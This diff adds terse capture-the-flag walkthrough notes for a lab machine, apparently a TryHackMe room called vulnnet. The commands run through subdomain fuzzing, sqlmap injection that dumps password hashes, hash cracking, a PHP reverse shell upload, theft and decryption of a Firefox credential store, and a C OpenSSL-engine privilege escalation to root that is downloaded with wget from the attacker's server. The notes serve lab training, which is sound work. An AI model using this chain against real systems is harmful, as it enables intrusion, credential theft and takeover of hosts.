@@ -1,0 +1,115 @@
+sudo nmap -sV -sC -A ip  
+
+sudo nano /etc/hosts (vulnnet.thm)
+
+git clone https://github.com/danielmiessler/SecLists
+
+ffuf -u http://vulnnet.thm -c -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'HOST: FUZZ.vulnnet.thm'
+
+sudo nano /etc/hosts
+10.201.29.54    api.vulnnet.thm
+10.201.29.54    blog.vulnnet.thm
+10.201.29.54    admin1.vulnnet.thm
+10.201.29.54    shop.vulnnet.thm
+
+dirb http://admin1.vulnnet.thm
+
+
+http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=0%20or%201=1  (in browser)
+
+sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch --dbs
+
+sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D vn_admin --tables
+
+sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D vn_admin -T be_users --columns
+
+sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D vn_admin -T be_users -C username,password --dump
+
+sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D blog --tables
+
+sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D blog -T users --columns
+
+sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 --batch -D blog -T users -C username,password --dump
+
+cd /root/.sqlmap/output/api.vulnnet.thm/dump/blog/
+
+cat users.csv
+
+cp users.csv /root/Desktop
+
+root@ip-10-201-25-146:~/Desktop# nano pwd.txt
+
+nano chris_w_hash (save the password from admin - chris user,pass)
+
+john chris_w_hash --wordlist=pwd.txt (password will be received) vAxWtmNzeTz
+
+nano php-reverse-shell.php  (first create a file and add the script)
+
+pentestmokey php(website)
+
+(upload on website .php file)
+
+nc -lvnp port
+ls-lah
+cd /home
+ls
+cd system
+ls -lah
+zip /tmp/mozilla.zip .mozilla -r
+
+cd /tmp
+ls -lah
+python3 -m http.server 8080 (later open ip:8080 and download the file)
+
+root@ip-10-201-9-50:~/Desktop# chmod +x mozilaa.zip
+
+unzip mozilaa.zip
+ls -lah
+
+cd .mozilla
+ls
+
+cd firefox
+ls -lah
+
+root@ip-10-201-9-50:~/Desktop/.mozilla/firefox# cat profiles.ini
+sudo nano profiles.ini
+
+python3.9 firefox_decrypt.py ~/Desktop/.mozilla/firefox
+
+ssh system@10.201.100.215
+
+cat user.txt
+
+/Desktop- getcap -r / 2>/dev/null
+
+nano openssl-exploit-engine.c
+(
+#include <openssl/engine.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+static int bind(ENGINE *e, const char *id)
+{
+  setuid(0); setgid(0);
+  system("/bin/bash");
+}
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()
+
+)
+
+sudo apt install libssl-dev
+
+gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
+
+gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o
+
+python3 -m http.server 8080
+
+system@vulnnet-endgame:~$ wget http://10.23.210.30:8080/openssl-exploit-engine.so
+
+/home/system/Utils/openssl req -engine ./openssl-exploit-engine.so
+
+
